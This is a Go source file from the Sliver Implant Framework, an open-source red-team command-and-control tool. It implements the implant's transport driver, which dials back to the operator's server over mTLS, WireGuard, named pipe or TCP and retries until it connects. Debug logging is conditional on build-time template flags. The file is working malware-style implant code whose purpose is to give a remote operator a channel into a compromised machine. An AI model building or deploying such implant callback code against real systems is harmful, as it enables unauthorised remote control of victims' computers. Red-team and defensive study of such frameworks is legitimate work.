package transports

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"

	// {{if .Config.TCPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/tcp"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
	// {{end}}

	// {{if .Config.WGc2Enabled}}

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
	// {{end}}

	// {{if .Config.NamePipec2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/namedpipe"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Dial - The driver dials (reverse) back to the server for a given
// transport protocol, if any such connection is needed by the channel.
func (t *Driver) Dial() (conn net.Conn, err error) {
	// {{if .Config.Debug}}
	log.Printf("Dialing (reverse) %s <- (%s)", t.URI.Host, t.URI.Scheme)
	// {{end}}

	for t.failures < int(t.MaxConnectionErrors) {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.C2 {

		// {{if .Config.MTLSc2Enabled}}
		case sliverpb.C2_MTLS:
			// Get physical
			conn, err = mtls.Dial(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} - MTLSc2Enabled

		// {{if .Config.WGc2Enabled}}
		case sliverpb.C2_WG:
			// Attempt to resolve the hostname in case
			// we received a domain name and not an IP address.
			// net.LookupHost() will still work with an IP address
			addrs, err := net.LookupHost(t.URI.Hostname())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to lookup host: %s", err)
				// {{end}}
				break
			}
			if len(addrs) == 0 {
				// {{if .Config.Debug}}
				log.Printf("Invalid address: %s", t.URI.String())
				// {{end}}
				break
			}

			hostname := addrs[0]
			wgConn, dev, err := wireguard.WGConnect(hostname, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to start WireGuard: %s", err.Error())
				// {{end}}
				if dev != nil {
					dev.Close()
				}
				t.WaitOnFailure()
				continue
			}
			conn = wgConn

			// Once we will close this C2 channel, we need to perform custom
			// cleanup here: closing the WireGuard virtual interface:
			// Passed to the Session layer when setting up the Session.
			t.Connection.Cleanup = func() error {
				// {{if .Config.Debug}}
				log.Printf("Closing Wireguard interface")
				// {{end}}
				dev.Close()
				return nil
			}
			// {{end}} - WGc2Enabled

		// {{if .Config.NamePipec2Enabled}}
		case sliverpb.C2_NamedPipe:
			conn, err = namedpipe.Dial(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} -NamePipec2Enabled

		// {{if .Config.TCPc2Enabled}}
		case sliverpb.C2_TCP:
			conn, err = tcp.Dial(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} -TCPc2Enabled
		default:
			// If the C2 transport protocol is not found,
			// the Channel does not need anything from here.
			return nil, nil
		}

		// If the connection is set (and thus not nil), break and return
		if conn != nil {
			break
		}
	}

	// Only return an error if we have exhausted attempts
	if t.failures == int(t.MaxConnectionErrors) {
		return nil, ErrMaxAttempts
	}

	// Else we have a connection, and no errors
	return conn, nil
}
